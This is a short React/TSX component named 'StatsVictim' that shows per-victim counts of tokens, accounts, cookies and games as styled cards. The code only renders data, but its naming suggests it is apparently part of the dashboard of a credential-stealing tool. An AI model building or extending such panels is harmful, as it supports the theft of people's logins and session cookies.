export const StatsVictim = ({ stats }: { stats: { [key: string]: number } }) => {
  const categories = [
    {
      name: 'Tokens',
      color: 'dark:to-pink-600/10 to-pink-600/10'
    },
    {
      name: 'Accounts',
      color: 'dark:to-purple-600/10 to-purple-600/10'
    },
    {
      name: 'Cookies',
      color: 'dark:to-blue-900/10 to-blue-900/10'
    },
    {
      name: 'Games',
      color: 'dark:to-emerald-600/10 to-emerald-600/10'
    }
  ];
  return (
    <>
      <div className="select-none py-5 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 base:grid-cols-4 gap-3 lg:!grid-cols-4 2xl:!grid-cols-4 !relative !overflow-hidden">
        {categories.map(({ name, color }, index: number) => (
          <div className="flex" key={index}>
            <div
              className={`lg:w-[270px] w-full h-[75px] rounded-md px-4 py-3 bg-gradient-to-r dark:from-black from-white ${color} border border-gray-400 dark:border-[#333]`}
            >
              <h1 className="text-black dark:text-white font-bold text-xl text-center">
                {stats[name.toLowerCase()] || 0}
              </h1>
              <p className="text-[10px] text-center uppercase tracking-[1px] font-semibold text-gray-800 dark:text-gray-200">
                {name}
              </p>
            </div>
          </div>
        ))}
      </div>
    </>
  );
};
